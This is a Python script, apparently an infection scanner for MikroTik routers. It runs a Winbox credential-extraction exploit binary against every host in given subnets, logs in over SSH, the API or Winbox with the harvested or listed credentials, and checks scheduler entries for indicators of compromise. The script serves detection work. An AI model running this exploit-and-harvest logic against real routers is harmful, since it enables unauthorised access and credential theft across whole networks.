import ipaddress
import argparse
import subprocess
import csv
import os
import stat
import re
import sys
import routeros_api
import routeros_api.exceptions
import paramiko

from concurrent.futures import ThreadPoolExecutor


# HELPER METHODS #
def read_file(filename):
    with open(filename, 'r', encoding='utf-8') as opened_file:
        return opened_file.read()


def make_binary_executable(name: str):
    st = os.stat(name)
    os.chmod(name, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def indicators_loader():
    return [x.strip()
            for x in read_file('indicators.txt').split('\n')
            if len(x.strip()) != 0]


def credentials_loader():
    credentials = [x.strip()
                   for x in read_file('credentials.txt').split("\n")
                   if len(x.strip()) != 0]

    split_credentials = [x.split(":", 1) for x in credentials]

    return split_credentials


def ioc_tester(indicators, content):
    for ioc in indicators:
        if ioc in content.lower():
            return True

    return False


def has_suspicious_url(content):
    hex_g = "[0-9a-fA-F]"
    uuid = hex_g + "{8}-" + hex_g + "{4}-" + hex_g + "{4}-" + hex_g + "{4}-" + hex_g + "{12}"
    sus_regex = re.compile("(https?://[^/]+/poll/" + uuid+")")

    return sus_regex.findall(content)
# END HELPER METHODS #


iocs = indicators_loader()
creds = credentials_loader()


# COMMUNICATION #
def connect_api(host, login, password):
    conn = routeros_api.RouterOsApiPool(
        host,
        port=8728,
        use_ssl=False,
        username=login,
        password=password,
        plaintext_login=True
    )
    try:
        api = conn.get_api()
    except routeros_api.exceptions.RouterOsApiCommunicationError:
        conn = routeros_api.RouterOsApiPool(
            host,
            port=8728,
            use_ssl=False,
            username=login,
            password=password,
            plaintext_login=False
        )
        try:
            api = conn.get_api()
        except routeros_api.exceptions.RouterOsApiCommunicationError as comm_error:
            raise Exception("Not connected") from comm_error

    # Here we have API
    return api.get_resource("/system/scheduler").call("print")


def exploit_winbox(address):
    cred_re = re.compile("credentials - ([\\s\\S]*)\\r?\\n")
    try:
        so = subprocess.check_output(["./btw", "--ip", address], stderr=subprocess.STDOUT)
        so = so.decode("utf-8")
        if "credentials - " in so:
            credentials = cred_re.findall(so)
            if len(credentials) != 0:
                found_credentials = credentials[0]
                split_credentials = found_credentials.split(":")
                login = split_credentials[0]
                pwd = ':'.join(split_credentials[1:])
                return [[login, pwd]]
            return []
        return []
    except:
        return []


def connect_winbox(address, login, pwd):
    so2 = subprocess.check_output([
        "./btw_stage2", "--ip", address, "--login", login, "--password", pwd
        ],
        stderr=subprocess.STDOUT
    )

    return so2.decode('utf-8')


def connect_ssh(address, login, pwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
    client.load_system_host_keys()
    client.connect(hostname=address,
                   username=login,
                   password=pwd)
    stdin, stdout, stderr = client.exec_command("/system scheduler export")

    out = stdout.read().decode().strip()
    error = stderr.read().decode().strip()

    return out + error
# END COMMUNICATION #


# SINGLE-IP LOGIC #
def exploit_ip(address: str):
    """
    This method exploits a single ip address
    :param address: IPv4 address string
    :return: ip, status, credentials (or emtpy string)
    """

    # global creds
    # global iocs

    creds_for_host = exploit_winbox(address)
    all_creds = creds_for_host + creds

    is_exploitable = len(creds_for_host) != 0
    if is_exploitable:
        is_exploitable = "EXPLOITABLE"
    else:
        is_exploitable = "NOT_EXPLOITABLE"

    for cred_pair in all_creds:
        try:
            scheduler_listing = [connect_ssh(address, cred_pair[0], cred_pair[1])]
        except:
            try:
                scheduler_listing = connect_api(address, cred_pair[0], cred_pair[1])
            except:
                try:

                    scheduler_listing = [connect_winbox(address, cred_pair[0], cred_pair[1])]
                    bad_strs = [
                        "[-] Failed to connect to the remote host",
                        "[!] Error receiving an open file response.",
                        "[-] Login failed."
                    ]
                    for x in bad_strs:
                        if x in scheduler_listing[0]:
                            raise Exception("Not connected")
                except:
                    continue

        found_ioc = False
        suspicious_strings = []
        for item in scheduler_listing:
            found_ioc = found_ioc or ioc_tester(iocs, item)
            suspicious_strings += has_suspicious_url(item)

        joined_strs = ';'.join(suspicious_strings)
        status_str = "NOT_INFECTED"
        if len(suspicious_strings) != 0:
            status_str = "LIKELY_INFECTED"

        if found_ioc:
            status_str = "INFECTED"

        return address, status_str, is_exploitable, joined_strs, cred_pair[0] + ":" + cred_pair[1]

    return address, "NOT_CONNECTED", "", "", ""
# END SINGLE-IP LOGIC #


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BTW multithreaded runner'
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--ip", type=str, nargs='+', help="IPv4 addresses or subnets to scan")
    group.add_argument("--ipfile", type=str, help="IPv4 Listing file")
    parser.add_argument("--threads", type=int, help="Number of threads (default 16)", default=16)

    args = parser.parse_args()

    # Make winbox binaries executable
    make_binary_executable('btw')
    make_binary_executable('btw_stage2')

    final_ip_listing = set()

    if args.ip is None:
        ff = read_file(args.ipfile)
        ips = [x.strip() for x in ff.split('\n') if len(x.strip()) != 0]
    else:
        ips = args.ip

    for ip in ips:
        if "/" in ip:
            try:
                ip_net = ipaddress.ip_network(ip, strict=False)
                for h in ip_net.hosts():
                    final_ip_listing.add(str(h))
            except ValueError as e:
                print("[-] Invalid IP network provided: " + ip)
                sys.exit(1)
        else:
            final_ip_listing.add(ip)

    final_listing = []

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        results = pool.map(exploit_ip, list(final_ip_listing))
        with open("exploited.csv", "w", encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["IP", "Status", "Exploitable", "IOCs", "Credentials Used"])
            # Stream the file
            for r in results:
                writer.writerow(r)
                f.flush()
